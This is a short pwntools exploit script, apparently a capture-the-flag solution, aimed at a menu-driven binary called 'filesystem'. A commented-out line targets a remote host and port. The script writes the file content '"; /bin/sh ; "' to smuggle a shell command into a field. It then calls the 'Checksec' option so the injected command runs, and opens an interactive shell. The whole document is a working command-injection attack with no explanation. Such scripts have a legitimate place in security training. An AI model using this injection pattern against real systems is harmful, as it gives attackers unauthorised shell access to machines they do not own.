from pwn import *

p = process('./filesystem')
#p = remote('101.71.29.5', 10017)
print p.recvuntil('> ')
p.sendline('Create')
print p.recvuntil('Input Filename: ')
p.sendline('aaaaa')

print p.recvuntil('> ')
p.sendline('Edit')
print p.recvuntil('Input the Index:')
p.sendline('0')
print p.recvuntil('Input File Content: ')
p.sendline('"; /bin/sh ; "')

print p.recvuntil('> ')
p.sendline('Checksec')
print p.recvuntil('Input the Index:')
p.sendline('0')
p.interactive()
